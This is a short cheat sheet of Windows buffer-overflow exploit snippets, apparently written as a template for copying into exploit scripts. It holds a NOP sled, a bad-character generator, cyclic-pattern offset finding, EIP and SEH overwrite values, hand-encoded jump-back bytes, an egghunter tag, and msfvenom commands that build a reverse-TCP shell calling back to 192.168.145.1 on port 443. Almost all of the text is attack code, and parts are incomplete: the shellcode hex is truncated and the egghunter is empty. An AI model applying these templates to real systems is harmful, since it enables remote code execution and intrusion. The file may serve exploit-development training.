# ================================================
# Copypasta. Copy relevant stuff into exploit
# ================================================

# === General ===
nop_sled = b"\x90"*32  # just some NOPS to slide into her DMs.. I mean my shellcode

badchars = b""
for i in range(0x01, 0xFF+1):  # same as 1 to 256
    badchars += str.encode(chr(i))

# === EIP overwrite ===
# alphanumeric cyclic
# pwn cyclic -a "123456789ABCDEF" -l XXXX
# generate cyclic pattern as byte array, alphanumeric only
cyclic_pattern = str.encode(cyclic(4000, "123456789ABCDEF"))

cyclic_pattern = cyclic_metasploit(4000)  # metasploit version

offset = 2047  # offset of EIP
junk = b"A" * offset
eip = b"BBBB"  # To test if we successfully overwrite the EIP
new_eip = p32(0x00000000)  # address converted to little endian
new_eip = struct.pack("<I", jmpesp) # import struct first.

# === SEH ===
nseh = b"\x74\x06\x75\x04"  # Jump Net techique(JZ 0x6, JNZ 0x4). This will bypass ascii restrictions as well
seh = p32(0x625010b4)  # pop pop ret - find with !mona seh


# === Jumping ===

# Manual jump based on stack difference
# b'TXf\x05e\x05\xff\xe0'
jumpback = asm("push esp; pop eax; add ax, 0x565; jmp eax;")
# manual hand encoding from2 nasmshell - also working22
jumpback = b"\x54\x58\x66\x05\x65\x05\xff\xe0"

# === egghunter ===

# !mona egg (-t EGGG) - defaults to w00t if tag not specified
egghunter = (

)
shellcode = b"w00tw00t"  # egghunter tag
shellcode += binascii.unhexlify("be3c4638")

# === Shellcode ===
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.145.1 LPORT=443 -b "\x00" -f hex EXINTFUNC=thread
# Converted to binary using binascii
shellcode = binascii.unhexlify("be3c4638")

# Traditional payload style
msfvenom -p windows/shell_reverse_tcp -b "\x00" lhost=192.168.145.1 lport=443 -f py -v shellcode EXINTFUNC=thread

